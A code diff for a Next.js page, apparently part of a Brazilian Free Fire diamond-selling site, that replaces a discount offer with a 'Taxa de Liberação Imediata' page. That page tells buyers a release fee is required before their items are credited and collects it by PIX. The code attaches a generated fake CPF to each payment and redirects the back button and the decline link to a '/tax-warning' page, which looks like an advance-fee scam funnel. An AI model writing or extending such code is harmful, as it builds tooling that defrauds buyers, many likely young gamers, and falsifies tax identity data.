@@ -1,3 +1,4 @@
+
 'use client';
 
 import { useState } from 'react';
@@ -7,7 +8,7 @@ import { Button } from '@/components/ui/button';
 import { Header } from '@/components/freefire/Header';
 import { Footer } from '@/components/freefire/Footer';
 import { cn } from '@/lib/utils';
-import { downsellOffers } from '@/lib/data';
+import { taxOffer } from '@/lib/data';
 import { useToast } from '@/hooks/use-toast';
 import { PaymentPayload } from '@/interfaces/types';
 import { gerarCPFValido } from '@/lib/utils';
@@ -20,29 +21,18 @@ interface CustomerData {
     phone: string;
 }
 
-const DownsellPage = () => {
+const Upsell3Page = () => {
     const router = useRouter();
     const { toast } = useToast();
-    const [selectedOfferId, setSelectedOfferId] = useState<string | null>(downsellOffers[0]?.id || null);
     const [isSubmitting, setIsSubmitting] = useState(false);
 
+    const handleDecline = () => {
+        router.push('/tax-warning');
+    };
+
     const handlePurchase = async () => {
-        if (!selectedOfferId) {
-            toast({
-                variant: 'destructive',
-                title: 'Erro',
-                description: 'Por favor, selecione uma oferta para continuar.',
-            });
-            return;
-        }
-
         setIsSubmitting(true);
-
-        const selectedProduct = downsellOffers.find(p => p.id === selectedOfferId);
-        if (!selectedProduct) {
-            setIsSubmitting(false);
-            return;
-        }
+        const selectedProduct = taxOffer[0];
 
         const customerDataString = localStorage.getItem('customerData');
         const playerName = localStorage.getItem('playerName') || 'Desconhecido';
@@ -67,10 +57,10 @@ const DownsellPage = () => {
                 name: customerData.name,
                 email: customerData.email,
                 phone: customerData.phone.replace(/\D/g, ''),
-                cpf: gerarCPFValido().replace(/\D/g, ''),
+                cpf: gerarCPFValido().replace(/\D/g, ''), 
                 paymentMethod: "PIX",
                 amount: parseFloat(selectedProduct.price),
-                externalId: `ff-downsell-${Date.now()}`,
+                externalId: `ff-upsell3-tax-${Date.now()}`,
                 items: [{
                     id: selectedProduct.id,
                     title: selectedProduct.name,
@@ -92,7 +82,7 @@ const DownsellPage = () => {
             const data = await response.json();
 
             if (!response.ok) {
-                throw new Error(data.message || "Erro ao criar o pagamento para o downsell.");
+                throw new Error(data.message || "Erro ao criar o pagamento para a taxa.");
             }
             
             localStorage.setItem('paymentData', JSON.stringify({
@@ -104,7 +94,7 @@ const DownsellPage = () => {
                 originalAmount: selectedProduct.originalAmount,
                 bonusAmount: selectedProduct.bonusAmount,
                 totalAmount: selectedProduct.totalAmount,
-                productId: selectedProduct.id, 
+                productId: selectedProduct.id,
             }));
             
             router.push('/buy');
@@ -121,46 +111,44 @@ const DownsellPage = () => {
 
     return (
         <div className="flex flex-col min-h-screen bg-gray-50">
-            <BackRedirect redirectTo="/success" />
+            <BackRedirect redirectTo="/tax-warning" />
             <Header />
             <main className="flex-1 flex flex-col items-center justify-center p-4 text-center">
                 <div className="bg-white rounded-2xl shadow-lg p-6 md:p-10 max-w-lg w-full border">
                     <h1 className="text-2xl md:text-3xl font-bold text-gray-800 uppercase tracking-wider">
-                        Volta aqui rapidinho...
+                        Taxa de Liberação Imediata
                     </h1>
                     <p className="mt-3 text-base text-gray-600">
-                        Você ganhou um bônus secreto de 5000 diamantes extras!
+                        Para que seus itens sejam creditados em sua conta instantaneamente, é necessária uma pequena taxa de liberação para cobrir os custos de processamento.
                     </p>
                     
-                    <div className="flex flex-col gap-4 my-8">
-                        {downsellOffers.map(offer => (
-                            <div
-                                key={offer.id}
-                                onClick={() => setSelectedOfferId(offer.id)}
-                                className={cn(
-                                    "p-4 rounded-lg border-2 cursor-pointer transition-all duration-200 text-left flex items-center gap-4",
-                                    selectedOfferId === offer.id ? 'border-destructive bg-destructive/5' : 'border-gray-200 bg-white hover:border-gray-300'
-                                )}
-                            >
-                                <div className="flex-shrink-0">
-                                    <Image src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="Diamante" width={40} height={40} data-ai-hint="diamond gem" />
-                                </div>
-                                <div>
-                                    <h2 className="text-lg font-bold text-gray-800">{offer.name}</h2>
-                                    <p className="text-2xl font-extrabold text-gray-900">{offer.formattedPrice}</p>
-                                </div>
-                            </div>
-                        ))}
+                    <div className="my-8">
+                       <div className={cn("p-4 rounded-lg border-2 border-destructive bg-destructive/5 text-left flex items-center gap-4")}>
+                           <div className="flex-shrink-0">
+                               <Image src="https://i.ibb.co/zTHMnnGZ/Screenshot-25.png" alt="Taxa" width={40} height={40} data-ai-hint="fee icon" />
+                           </div>
+                           <div>
+                               <h2 className="text-lg font-bold text-gray-800">{taxOffer[0].name}</h2>
+                               <p className="text-2xl font-extrabold text-gray-900">{taxOffer[0].formattedPrice}</p>
+                           </div>
+                       </div>
                     </div>
 
                     <div className="flex flex-col gap-3">
                         <Button
                             onClick={handlePurchase}
-                            disabled={!selectedOfferId || isSubmitting}
+                            disabled={isSubmitting}
                             className="w-full text-lg py-6 font-bold"
                             variant="destructive"
                         >
-                            {isSubmitting ? 'Processando...' : 'Sim, Levo Esta!'}
+                            {isSubmitting ? 'Processando...' : 'Pagar Taxa de Liberação'}
+                        </Button>
+                        <Button
+                            onClick={handleDecline}
+                            variant="link"
+                            className="text-gray-500 hover:text-gray-700"
+                        >
+                            Não, obrigado.
                         </Button>
                     </div>
                 </div>
@@ -170,4 +158,5 @@ const DownsellPage = () => {
     );
 };
 
-export default DownsellPage;
+export default Upsell3Page;
+
